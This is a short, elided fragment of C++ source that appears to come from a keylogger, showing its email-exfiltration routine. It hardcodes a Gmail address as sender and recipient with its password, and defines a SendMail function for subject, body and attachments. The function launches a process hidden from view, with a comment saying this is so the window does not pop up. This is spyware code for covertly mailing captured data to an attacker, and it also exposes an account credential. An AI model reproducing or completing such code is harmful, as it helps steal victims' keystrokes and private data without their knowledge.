...
namespace Mail
{
    #define X_EM_TO "madeforprojs@gmail.com"
    #define X_EM_FROM "madeforprojs@gmail.com"
    #define X_EM_PASS "Keylogger2025"
...
#undef X_EM_PASS
    ...
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        ...
        ShExecInfo.nShow = SW_HIDE;//to not make the window pop up
